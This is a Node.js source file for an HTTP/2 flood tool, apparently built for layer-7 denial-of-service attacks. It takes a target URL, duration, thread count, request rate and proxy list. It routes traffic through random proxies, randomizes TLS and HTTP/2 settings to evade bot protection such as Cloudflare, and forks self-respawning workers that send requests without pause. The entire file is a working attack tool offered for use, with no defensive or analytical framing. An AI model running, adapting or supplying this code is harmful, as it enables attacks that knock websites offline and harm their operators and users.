const http = require("http");
const tls = require("tls");
const crypto = require("crypto");
const cluster = require("cluster");
const fs = require("fs");
const url = require("url");
const os = require("os");
const http2 = require("http2-wrapper");
const { getHeaders } = require('./generator');

const [target, time, threads, ratelimit, proxyfile] = process.argv.slice(2);
const proxies = fs.readFileSync(proxyfile, 'utf-8').toString().replace(/\r/g, '').split('\n');
const parsed = url.parse(target);

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', (e) => {
	console.log(e);
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) {
		return false;
	}
})
process.on('unhandledRejection', (e) => {
	console.log(e);
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) {
		return false;
	}
})
process.on('warning', (e) => {
	console.log(e);
	if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) {
		return false;
	}
})

function getRandomValue(min, max) {
	return Math.floor(Math.random() * (max - min + 1)) + min;
}

const agent = new http.Agent({
	keepAlive: true,
	keepAliveMsecs: 50000,
	maxSockets: Infinity,
	maxFreeSockets: Infinity,
	maxTotalSockets: Infinity,
	timeout: time * 1000,
});

function requestHandler(session, headersData, index) {
	const req = session.request(headersData);
	req.setEncoding('utf8');
	req.end();

	function finalizeRequest() {
		activeRequests--;
		closeSessionIfDone();
	}

	req.on('ready', () => {
		finalizeRequest();
	});

	req.on('headers', (headers) => {
		finalizeRequest();
	});

	req.on('data', (chunk) => { });

	req.on('end', finalizeRequest);

	req.on('error', (err) => {
		finalizeRequest();
	});
}
function work() {
	const [proxyHost, proxyPort] = proxies[Math.floor(Math.random() * proxies.length)].split(':');
	const request = http.get({
		method: 'CONNECT',
		host: proxyHost,
		port: proxyPort,
		agent,
		path: `${parsed.host}:443`,
		headers: {
			'Connection': 'Keep-Alive',
			'Proxy-Connection': 'Keep-Alive'
		},
		rejectUnauthorized: true,
	});

	request.on('error', request.destroy);

	request.on('connect', (res, socket, { head }) => {
		if (head?.length) return socket.destroy();

		const ciphers = ['TLS_AES_128_GCM_SHA256', 'TLS_CHACHA20_POLY1305_SHA256', 'TLS_AES_256_GCM_SHA384', 'TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256'].join(':');
		const sigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512';
		const options = getHeaders(parsed);
		const settings = options.settings;
		console.log(settings);

		const sessionOptions = {
			createConnection: (authority, option) => tls.connect({
				...option,
				socket,
				servername: parsed.host,
				session: head,
				agent,
				secure: true,
				challengesToSolve: 3,
				cloudflareTimeout: 12000,
				cloudflareMaxTimeout: 20000,
				sessionTimeout: 5000,
				sessionMaxTimeout: 60000,
				requestOCSP: true,
				ALPNProtocols: ["h2", "http/1.1"],
				ciphers: ciphers,
				sigalgs: sigalgs,
				requestCert: true,
			}),
			settings: {
				...(Math.random() < 0.5 ? { headerTableSize: settings.defautl } : {}),
				enablePush: settings.default1,
				...(Math.random() < 0.5 ? { initialWindowSize: settings.default2 } : {}),
				...(Math.random() < 0.5 ? { maxHeaderListSize: settings.default3 } : {}),
			},
		};

		const sessionState = { flags: 0 };

		const session = http2.connect(`https://${parsed.host}`, sessionOptions, () => {
			session.setLocalWindowSize(getRandomValue(15663105, 2147483647));
		});

		let activeRequests = 0;
		let timeoutHandle;

		const resetTimeout = () => {
			clearTimeout(timeoutHandle);
			timeoutHandle = setTimeout(() => activeRequests && session.destroy(), 3000);
		};

		const closeSessionIfDone = () => {
			if (!activeRequests) {
				sessionState.flags |= 1;
				session.destroy();
			}
		};

		session.on('error', () => {
			sessionState.flags |= 1;
			session.destroy();
		});

		session.on('connect', () => {
			Array.from({ length: ratelimit }).forEach((_, index) => {
				const isFirstRequest = index === 0;
				const headersData = options.header;
				requestHandler(session, headersData, index);
			});
			resetTimeout();
		});

		const requestHandler = (session, headersData, index) => {
			const req = session.request(options.header);
			req.setEncoding('utf8');
			req.end();

			function finalizeRequest() {
				activeRequests--;
				closeSessionIfDone();
			}

			req.on('ready', () => {
				finalizeRequest();
			});

			req.on('headers', (headers) => {
				finalizeRequest();
			});

			req.on('data', (chunk) => { });

			req.on('end', finalizeRequest);

			req.on('error', (err) => {
				finalizeRequest();
			});
		};


	});
	request.end();
};

if (cluster.isMaster) {
	Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

	cluster.on('exit', (worker) => {
		cluster.fork({ core: worker.id % os.cpus().length });
	});

	setTimeout(() => process.exit(-1), time * 1000);
} else {
	setInterval(work);
	setTimeout(() => process.exit(-1), time * 1000);
}
